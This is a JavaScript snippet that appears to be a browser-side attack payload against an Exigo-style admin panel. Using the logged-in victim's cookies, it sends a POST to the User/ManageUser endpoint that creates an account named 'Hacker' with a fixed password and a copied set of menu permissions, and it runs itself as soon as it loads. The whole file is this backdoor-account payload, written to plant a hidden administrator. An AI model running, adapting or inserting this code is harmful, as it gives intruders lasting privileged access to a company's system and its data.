async function createAdmin() {

  const parts = window.location.pathname.split("/").filter(Boolean);

  // parts example:
  // ["admin6","v2025.12.16.3","6e306bbf509c41b28f7fcaecffd2b7df","User","UserAdd"]

  const basePath = parts.slice(0, 3).join("/");

  const url = `${location.origin}/${basePath}/User/ManageUser?popup=1`;

  console.log("Request URL:", url);

  // your existing request logic continues here


  const params = new URLSearchParams();

  params.append("UserID", "0");
  params.append("UserFromModelID", "");
  params.append("PasswordAge", "1/1/0001 12:00:00 AM");

  params.append("WarehouseName", "");
  params.append("DepartmentName", "");

  params.append("LoginName", "Hacker");
  params.append("FirstName", "Hacker");
  params.append("LastName", "Hacker");

  params.append("Password", "Exigo1234!");
  params.append("Confirm", "Exigo1234!");

  params.append("Warehouse", "1");
  params.append("DepartmentTY", "2");
  params.append("SessionTimeout", "30");

  // permissions copied from request
  params.append(
    "Menu.EnabledIds",
    "1d5981233fe74404823f63dae890c44f,8f7cd55d64ac4da9b9b97c3a0e6f0393,cb162e47c8cf46f9a6d47d12ffe93473,95861cb7f3674c0c8527deb2f9ec7fe4,151d6c8a84794543a7bc2b17c64b7689,19a6fc9d59dd44f6884fdcb13091f3b3,ef3a0c95d82a4334a12623db2d25233a,532ba32c7efd4f6c8ae6e8efcc4508ac,1247d804bdc24126a5220e81a4d2e095"
  );

  params.append("Address", "");
  params.append("City", "");
  params.append("State", "");
  params.append("Zip", "");
  params.append("HomePhone", "");
  params.append("WorkPhone", "");
  params.append("WorkPhoneExtension", "");
  params.append("CellPhone", "");

  params.append("Email", "No Default Email");

  const r = await fetch(url, {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "X-Requested-With": "XMLHttpRequest"
    },
    body: params.toString()
  });

  const text = await r.text();
  console.log("status:", r.status);
  console.log(text);

}

createAdmin();
